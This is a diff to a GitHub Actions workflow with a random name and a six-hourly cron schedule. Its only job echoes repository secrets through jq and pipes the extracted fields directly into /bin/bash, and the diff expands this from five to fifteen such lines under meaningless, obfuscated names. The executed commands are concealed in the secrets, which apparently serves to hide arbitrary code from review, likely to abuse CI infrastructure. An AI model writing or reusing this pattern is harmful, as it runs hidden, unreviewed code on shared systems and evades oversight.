@@ -2,9 +2,9 @@ name: yangbinxi3618
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '59 3/6 * * *'
 
-jobs:  # 15894
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +12,21 @@ jobs:  # 15894
       - uses: actions/checkout@v4
       - name: yangbinxi3618
         env:
-          mfi226: ${{ secrets.mfi226 }}
+          xj528: ${{ secrets.xj528 }}
         run: |
-          echo $mfi226 | jq -r .wb353 | /bin/bash
-          echo $cg71 | jq -r .yvh06907 | /bin/bash
-          echo $ozaf9 | jq -r .h542 | /bin/bash
-          echo $lom64832 | jq -r .e07570 | /bin/bash
-          echo $klxr9168 | jq -r .ndugh2578 | /bin/bash
+          echo $xj528 | jq -r .pnnu0 | /bin/bash
+          echo $gxt5 | jq -r .zd12780 | /bin/bash
+          echo $l0878 | jq -r .tsfxa6 | /bin/bash
+          echo $vor3 | jq -r .llmp0 | /bin/bash
+          echo $mixc5117 | jq -r .q5 | /bin/bash
+          echo $igqht1451 | jq -r .zcm76693 | /bin/bash
+          echo $k10417 | jq -r .xp06178 | /bin/bash
+          echo $vu32 | jq -r .xui059 | /bin/bash
+          echo $ugaqx04316 | jq -r .bryb918 | /bin/bash
+          echo $xou9106 | jq -r .hsco55286 | /bin/bash
+          echo $sr371 | jq -r .ccr6900 | /bin/bash
+          echo $nb5528 | jq -r .vgulv91 | /bin/bash
+          echo $pcmwy09010 | jq -r .i4256 | /bin/bash
+          echo $fb5647 | jq -r .q2 | /bin/bash
+          echo $rhgd20870 | jq -r .pqed99 | /bin/bash
 
